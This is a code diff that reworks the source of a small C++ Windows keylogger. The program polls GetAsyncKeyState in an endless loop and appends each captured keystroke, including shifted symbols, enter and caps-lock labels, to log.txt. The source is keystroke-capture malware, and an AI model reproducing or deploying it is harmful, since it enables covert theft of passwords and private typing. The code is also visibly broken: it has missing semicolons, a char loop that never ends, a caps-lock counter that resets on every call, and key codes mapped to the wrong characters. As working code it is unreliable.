@@ -1,6 +1,6 @@
-#include<fstream>
-#include<Windows.h>
-#include<iostream>
+#include <fstream>
+#include <Windows.h>
+#include <iostream>
 
 using namespace std;
 
@@ -8,72 +8,142 @@ int save(int key);
 
 int main()
 {
-    char input;
-    while (true)
-    {for(input=8;input<=255;input++)
-    {if(GetAsyncKeyState(input)==-32767)
-      save(input);
-    }
-    }
-    return 0;
+	char input;
+	while (true)
+	{
+		for (input = 8; input <= 127; input++)
+		{
+			if (GetAsyncKeyState(input) == -32767)
+				save(input);
+		}
+	}
+	return 0;
 }
 
 int save(int key)
-{  
-    ofstream fout;
-    fout.open("log.txt",ios::out|ios::app);
-    switch(key)
-    { case 8:fout<<"[backspace]"; break;
-      
-      case 9:fout<<"[horizontal tab]"; break;
-      
-      case 32:fout<<"[space]"<< ; break;
-      
-      case 33:fout<<"!" break;
-      
-      case 50: fout << "@"; break;
-				// It can vary by keyboard.
-		  case 51: fout << "#"; break;
-				// It can vary by keyboard.
-			case 52: fout << "$"; break;
-				// It can vary by keyboard.
-			case 53: fout << "%"; break;
-				// It can vary by keyboard.
-			case 54: fout << "^"; break;
-				// It can vary by keyboard.
-			case 55: fout << "&"; break;
-				// It can vary by keyboard.
-			case 56: fout << "*"; break;
-				// It can vary by keyboard.
-			case 57: fout << "("; break;
-				// It can vary by keyboard.
-			case 186: fout << ":"; break;
-				// It can vary by keyboard.
-			case 187: fout << "+"; break;
-				// It can vary by keyboard.
-			case 188: fout << "<"; break;
-				// It can vary by keyboard.
-			case 189: fout << "_"; break;
-			
-			case 190: fout << ">"; break;
-			
-			case 191: fout << "\?"; break;
-				// It can vary by keyboard.
-			case 192: fout << "~"; break;
-				// It can vary by keyboard.
-			case 219: fout << "{"; break;
-				// It can vary by keyboard.
-			case 220: fout << "|"; break;
-				// It can vary by keyboard.
-			case 221: fout << "}"; break;
-				// It can vary by keyboard.
-			case 222: fout << "\""; break;                 
-    
-       default :cout<<(char)key<<endl;
-                fout<<(char)key;
-                break;
-    }            
-    fout.close();
-    return 0;
-    
+{
+	int i = 0;
+	ofstream fout;
+	fout.open("log.txt", ios::out | ios::app);
+
+	if (key == 8)
+		fout << "[backspace]";
+
+	else if (key == 9)
+		fout << "[horizontal tab]";
+
+	else if (key == 32)
+		fout << "[space]"
+			 << " ";
+	else if (key == 13)
+		fout << endl
+			 << "[enter]" << endl;
+	else if (key == 20)
+	{
+		if (i % 2 == 0)
+			fout << "[capsON]";
+		else
+			fout << "capsOFF";
+		i++;
+	}
+
+	else if (GetAsyncKeyState(VK_SHIFT))
+	{
+		switch (key)
+		{
+		case 33:
+			fout << "!" break;
+
+		case 34:
+			fout << "\"";
+			break;
+			// It can vary by keyboard.
+		case 35:
+			fout << "#";
+			break;
+			// It can vary by keyboard.
+		case 36:
+			fout << "$";
+			break;
+			// It can vary by keyboard.
+		case 37:
+			fout << "%";
+			break;
+			// It can vary by keyboard.
+		case 94:
+			fout << "^";
+			break;
+			// It can vary by keyboard.
+		case 38:
+			fout << "&";
+			break;
+			// It can vary by keyboard.
+		case 42:
+			fout << "*";
+			break;
+			// It can vary by keyboard.
+		case 40:
+			fout << "(";
+			break;
+			// It can vary by keyboard.
+		case 41:
+			fout << ":";
+			break;
+			// It can vary by keyboard.
+		case 43:
+			fout << "+";
+			break;
+			// It can vary by keyboard.
+		case 60:
+			fout << "<";
+			break;
+			// It can vary by keyboard.
+		case 95:
+			fout << "_";
+			break;
+
+		case 62:
+			fout << ">";
+			break;
+
+		case 63:
+			fout << "?";
+			break;
+			// It can vary by keyboard.
+		case 126:
+			fout << "~";
+			break;
+			// It can vary by keyboard.
+		case 123:
+			fout << "{";
+			break;
+			// It can vary by keyboard.
+		case 124:
+			fout << "|";
+			break;
+			// It can vary by keyboard.
+		case 125:
+			fout << "}";
+			break;
+			// It can vary by keyboard.
+
+		default:
+			break;
+		}
+	}
+
+	else
+	{
+		if (GetAsyncKeyState(VK_CAPITAL))
+			fout << (char)key;
+		else
+		{
+			if (i % 2 == 0)
+				fout << (char)(key + 32);
+			else
+				fout << (char)key;
+		}
+	}
+	fout.close();
+	return 0;
 }
